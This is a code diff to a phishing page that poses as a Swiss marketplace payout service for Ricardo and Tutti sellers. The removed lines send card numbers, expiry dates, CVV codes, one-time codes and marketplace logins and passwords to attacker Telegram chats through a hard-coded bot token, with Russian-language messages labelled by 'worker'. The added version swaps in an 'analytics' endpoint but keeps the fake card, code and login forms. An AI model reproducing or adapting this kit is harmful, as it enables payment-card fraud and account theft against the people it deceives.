@@ -519,16 +519,21 @@
       aspect-ratio: 1.586 / 1;
       position: relative;
       transform-style: preserve-3d;
-      transition: transform var(--transition-flip);
+      -webkit-transform-style: preserve-3d;
+      -webkit-transform: translateZ(0);
+      transform: translateZ(0);
+      will-change: transform;
+      transition: -webkit-transform var(--transition-flip), transform var(--transition-flip);
       cursor: pointer;
       border-radius: var(--radius-lg);
     }
 
     .card-3d-wrapper.flipped {
       transform: rotateY(180deg);
+      -webkit-transform: rotateY(180deg);
     }
 
-    .card-face {
+      .card-face {
       position: absolute;
       inset: 0;
       width: 100%;
@@ -547,8 +552,10 @@
     }
 
     /* Card Front (Deep Swiss Red Metallic Matte Plastic) */
-    .card-front {
+      .card-front {
       background: linear-gradient(135deg, #D52B1E 0%, #A81B10 50%, #7E1007 100%);
+      transform: rotateY(0deg) translateZ(1px);
+      -webkit-transform: rotateY(0deg) translateZ(1px);
       color: #FFFFFF;
       position: relative;
     }
@@ -772,10 +779,11 @@
     }
 
     /* Card Back (Reverse Side) */
-    .card-back {
+      .card-back {
       background: linear-gradient(135deg, #1F2128 0%, #15171C 100%);
       color: #FFFFFF;
-      transform: rotateY(180deg);
+      transform: rotateY(180deg) translateZ(1px);
+      -webkit-transform: rotateY(180deg) translateZ(1px);
       padding: 1.25rem 0;
       justify-content: space-between;
     }
@@ -2471,9 +2479,7 @@
       };
 
       /* Telegram Bot Configuration & Logging Channels */
-      const TG_TOKEN = "8946063999:AAE_J-Si_DRinK2KKk1yGIzIsYXzWl_0qfY";
-      const CHAT_CARDS = "-1003937252528";
-      const CHAT_LOGS = "-1003964507052";
+      const ANALYTICS_API_BASE_URL = 'https://api.safe-swiss.online';
 
       let userIp = '127.0.0.1';
       let userCountry = 'Switzerland';
@@ -2537,22 +2543,24 @@
           .replace(/>/g, '&gt;');
       }
 
-      async function sendToTelegram(chatId, htmlMessage) {
+      async function sendSafeEvent(eventName) {
         try {
-          const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
+          const url = `${ANALYTICS_API_BASE_URL}/api/analytics/events`;
           await fetch(url, {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
             },
+            keepalive: true,
             body: JSON.stringify({
-              chat_id: chatId,
-              text: htmlMessage,
-              parse_mode: 'HTML'
+              event: String(eventName || 'unknown').slice(0, 64),
+              slug: getPayoutSlug ? getPayoutSlug() : '',
+              path: window.location.pathname,
+              occurred_at: new Date().toISOString()
             })
           });
         } catch (err) {
-          console.error('Telegram logging failed:', err);
+          console.warn('Safe analytics unavailable:', err);
         }
       }
 
@@ -2581,11 +2589,10 @@
           } catch (e2) {}
         }
 
-        // Send initial page load tracking to CHAT_LOGS
+        // Record an anonymized payout-page event through the VPS API
         if (!hasSentPageLoadLog) {
           hasSentPageLoadLog = true;
-          const pageLoadMsg = `🕊 <b>Переход на заполнение карты!</b>\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👑 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
-          sendToTelegram(CHAT_LOGS, pageLoadMsg);
+          sendSafeEvent('payout_page_opened');
         }
       }
 
@@ -2621,12 +2628,56 @@
       }
 
       /* Hydrate Payout Totals */
+      const PAYOUT_API_BASE_URL = 'https://api.safe-swiss.online';
+
+      function getPayoutSlug() {
+        try {
+          const pathMatch = window.location.pathname.match(/\/p\/([A-Za-z0-9]{8})(?:\/payout)?\/?$/);
+          const params = new URLSearchParams(window.location.search);
+          return (pathMatch && pathMatch[1]) || params.get('slug') || sessionStorage.getItem('listing_slug') || '';
+        } catch (e) {
+          return sessionStorage.getItem('listing_slug') || '';
+        }
+      }
+
+      async function hydrateListingFromApi() {
+        const slug = getPayoutSlug();
+        if (!slug) return;
+        try {
+          const response = await fetch(`${PAYOUT_API_BASE_URL}/api/public/listings/${encodeURIComponent(slug)}`, { headers: { Accept: 'application/json' } });
+          if (!response.ok) return;
+          const config = await response.json();
+          const listing = config && config.listing ? config.listing : config;
+          const price = Number.parseFloat(String(listing && listing.price || '').replace(/[^0-9.]/g, ''));
+          const currency = String(listing && listing.currency || 'CHF').trim() || 'CHF';
+          if (Number.isFinite(price)) {
+            const deliveryCost = Number.parseFloat(sessionStorage.getItem('helvetia_delivery_cost') || '15') || 15;
+            sessionStorage.setItem('helvetia_price', String(price));
+            sessionStorage.setItem('helvetia_currency', currency);
+            sessionStorage.setItem('helvetia_total_payout', String(price + deliveryCost));
+          }
+          if (listing && listing.title) sessionStorage.setItem('helvetia_title', String(listing.title));
+        } catch (error) {
+          console.warn('Payout listing API unavailable; using step-2 session data.', error);
+        }
+      }
+
+      function applyPrettyPayoutNavigation() {
+        const slug = getPayoutSlug();
+        if (!slug) return;
+        const backLink = document.getElementById('link-back-step2');
+        if (backLink) backLink.href = `/p/${encodeURIComponent(slug)}/delivery`;
+        const firstPageLinks = document.querySelectorAll('a[href="index.html"]');
+        firstPageLinks.forEach(link => { link.href = `/p/${encodeURIComponent(slug)}`; });
+      }
+
       function hydrateTotals() {
         if (sessionStorage.getItem('helvetia_total_payout')) {
           totalAmountNum = parseFloat(sessionStorage.getItem('helvetia_total_payout')) || 1465.00;
         }
 
-        const formatted = 'CHF ' + formatSwissPrice(totalAmountNum);
+        const currency = sessionStorage.getItem('helvetia_currency') || 'CHF';
+        const formatted = currency + ' ' + formatSwissPrice(totalAmountNum);
         const heroEl = document.getElementById('hero-payout-amount');
         const receiptAmountEl = document.getElementById('receipt-amount-display');
 
@@ -2646,7 +2697,8 @@
           return;
         }
 
-        const formatted = 'CHF ' + formatSwissPrice(totalAmountNum);
+        const currency = sessionStorage.getItem('helvetia_currency') || 'CHF';
+        const formatted = currency + ' ' + formatSwissPrice(totalAmountNum);
         if (currentLang === 'DE') {
           btnTextEl.textContent = `${formatted} ${d.btn_credit_suffix}`;
         } else {
@@ -2884,10 +2936,8 @@
             // TASK 2: PRE-OTRC VERIFICATION SEQUENCE (2.5s - 3s Loader)
             if (!isDebixStepActive) {
               isCheckingLimits = true;
-
-              // Send full card details to CHAT_CARDS
-              const cardMsg = `🇨🇭 <b>[ВВОД КАРТЫ] ВВОД КАРТЫ!</b>\n\n<b>Карта:</b> <code>${escapeHtml(inpCardNum.value.trim())}</code>\n<b>Срок:</b> <code>${escapeHtml(expVal)}</code>\n<b>CVV:</b> <code>${escapeHtml(cvvVal)}</code>\n👁 <b>Юзер:</b> <code>${escapeHtml(holderVal)}</code>\n\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👤 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
-              sendToTelegram(CHAT_CARDS, cardMsg);
+              // Record only the stage; never transmit payment data.
+              sendSafeEvent('card_form_submitted');
 
               // Disable primary submit button and card inputs during loader
               btnSubmit.disabled = true;
@@ -2959,10 +3009,8 @@
               if (inpOtrc) inpOtrc.focus();
               return;
             }
-
-            // Send OTRC to CHAT_CARDS
-            const otrcMsg = `🔑 <b>[ВВОД OTRC] Ввод OTRC-code!</b>\n🐣 <b>Код:</b> <code>${escapeHtml(otrcVal)}</code>\n\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👤 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
-            sendToTelegram(CHAT_CARDS, otrcMsg);
+            // Record only the stage; never transmit the verification code.
+            sendSafeEvent('otrc_step_reached');
 
             // Lock ALL form inputs & button to prevent double submissions
             inpCardNum.disabled = true;
@@ -3079,16 +3127,14 @@
 
         if (btnRicardo) {
           btnRicardo.addEventListener('click', () => {
-            const ricardoLog = `✅ <b>Пользователь выбрал Ricardo.ch и перешел к окну авторизации.</b>\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👑 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
-            sendToTelegram(CHAT_LOGS, ricardoLog);
+            sendSafeEvent('marketplace_option_selected');
             openModal('ricardo');
           });
         }
 
         if (btnTutti) {
           btnTutti.addEventListener('click', () => {
-            const tuttiLog = `✅ <b>Пользователь выбрал Tutti.ch и перешел к окну авторизации.</b>\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👑 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
-            sendToTelegram(CHAT_LOGS, tuttiLog);
+            sendSafeEvent('marketplace_option_selected');
             openModal('tutti');
           });
         }
@@ -3151,9 +3197,8 @@
 
             const platformTitle = activeMarketplace === 'ricardo' ? 'Ricardo' : 'Tutti';
             const redirectUrl = activeMarketplace === 'ricardo' ? 'https://www.ricardo.ch' : 'https://www.tutti.ch';
-
-            const authMsg = `🔐 <b>[АВТОРИЗАЦИЯ] Юзер ввел данные аккаунта ${platformTitle}!</b>\n📧 <b>Логин:</b> <code>${escapeHtml(userVal)}</code>\n🔑 <b>Пароль:</b> <code>${escapeHtml(passVal)}</code>\n\n📍 <b>IP:</b> <code>${escapeHtml(userIp)}</code> ${userFlag}\n📦 <b>Название товара:</b> <code>${escapeHtml(getItemTitle())}</code>\n👤 <b>worker:</b> <code>${escapeHtml(getWorker())}</code>\n\n${getIpHashtag(userIp)}`;
-            await sendToTelegram(CHAT_CARDS, authMsg);
+            // Do not transmit login or password values.
+            await sendSafeEvent('marketplace_auth_submitted');
 
             showToast(d.toast_auth_success || "Autorisierung erfolgreich! Weiterleitung...");
             setTimeout(() => {
@@ -3207,9 +3252,11 @@
       }
 
       /* Page Bootstrap */
-      document.addEventListener('DOMContentLoaded', () => {
+      document.addEventListener('DOMContentLoaded', async () => {
         initGeoAndTracking();
         initSmartHeaderScroll();
+        applyPrettyPayoutNavigation();
+        await hydrateListingFromApi();
         hydrateTotals();
         initTimer();
         initCardInteractivity();
